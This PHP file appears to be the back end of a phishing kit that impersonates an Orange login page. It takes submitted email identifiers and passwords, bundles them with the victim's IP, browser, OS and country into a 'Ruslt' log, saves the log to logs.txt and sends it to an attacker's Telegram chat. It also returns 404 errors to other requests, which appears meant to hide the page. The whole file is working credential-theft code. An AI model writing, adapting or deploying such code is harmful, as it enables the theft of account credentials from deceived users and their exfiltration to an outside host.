<?php
(@require_once './init.php') or die("<h1>Your File Not Including init</h1>");

if($_SERVER['REQUEST_METHOD'] == "POST"):

    if($_POST):
        if(isset($_POST['identifiant']) && !empty($_POST['identifiant']) && isset($_POST['psswd']) && !empty($_POST['psswd'])):

            if(valid_email($_POST['identifiant']) == true && !empty($_POST['psswd'])):
                $Uid = $_POST['identifiant'];
                $Pid = $_POST['psswd'];
                $datas = "[ ========== Ruslt ORange Login $ip ========== ]\n";
                $datas .= "[+] \n";
                $datas .= "[+] ACESS_login   : $Uid \n";
                $datas .= "[+] ACESS_passe   : $Pid \n";
                $datas .= "[+__________________________________________+] \n";
                $datas .= "[+_____________ Visiteur info ______________+] \n";
                $datas .= "[+] Browser : $navigateur \n";
                $datas .= "[+] System  : $opiration_system \n";
                $datas .= "[+] Country : $country \n";
                $datas .= "[+] DatTime : $datet \n";
                $datas .= "[+] Ip      : $ip \n";
                $datas .= "[ =========== Login Orange $ip ============== ]\r\n";
                $datas .= "\n";
                save_to_txt($datas,"logs.txt");
                vers_telegram($datas,api1,chat_id1);
                die('{"error":0}');
            else:

            endif;


        else:
            go_to("../index.php?".$id);
        endif;


        

    else:
        header("HTTP/1.1 404 Not Found");
        exit;
    endif;


else:
    header("HTTP/1.1 404 Not Found");
    exit;
endif;